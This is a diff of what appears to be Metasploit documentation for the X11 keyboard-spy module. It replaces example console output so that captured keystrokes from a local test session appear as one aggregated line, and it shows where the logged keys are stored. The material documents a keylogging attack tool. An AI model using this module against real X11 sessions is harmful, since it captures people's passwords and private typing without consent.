@@ -139,47 +139,16 @@ msf6 auxiliary(gather/x11_keyboard_spy) > run
 [*] 127.0.0.1:6000 - [8/9] Enabling notification on keyboard and map
 [*] 127.0.0.1:6000 - [9/9] Creating local keyboard map
 [+] 127.0.0.1:6000 - All setup, watching for keystrokes
-t
-e
-[space]
-q
-u
-u
-i
-c
-k
-[space]
-r
-o
-w
-n
-[space]
-f
-o
-x
-m
-p
-s
-[space]
-o
-v
-e
-e
-r
-r
-[space]
-t
-h
-e
-[space]
-l
-a
-z
-y
-[space]
-d
-o
-^C[*] 127.0.0.1:6000 - Closing X11 connection
+[+] 127.0.0.1:6000 - X11 Key presses observed: te[space]quuick[space]rown[space]foxmps[space]oveerr[space]the[space]lazy[space]do
+[-] 127.0.0.1:6000 - No key presses observed
+[-] 127.0.0.1:6000 - No key presses observed
+[-] 127.0.0.1:6000 - No key presses observed
+[-] 127.0.0.1:6000 - No key presses observed
+[-] 127.0.0.1:6000 - No key presses observed
+[-] 127.0.0.1:6000 - No key presses observed
+[-] 127.0.0.1:6000 - No key presses observed
+[-] 127.0.0.1:6000 - No key presses observed
+[*] 127.0.0.1:6000 - Closing X11 connection
 [+] 127.0.0.1:6000 - Logged keys stored to: /root/.msf4/loot/20240226150211_default_127.0.0.1_x11.keylogger_839830.txt
 [-] 127.0.0.1:6000 - Stopping running against current target...
 [*] 127.0.0.1:6000 - Control-C again to force quit all targets.
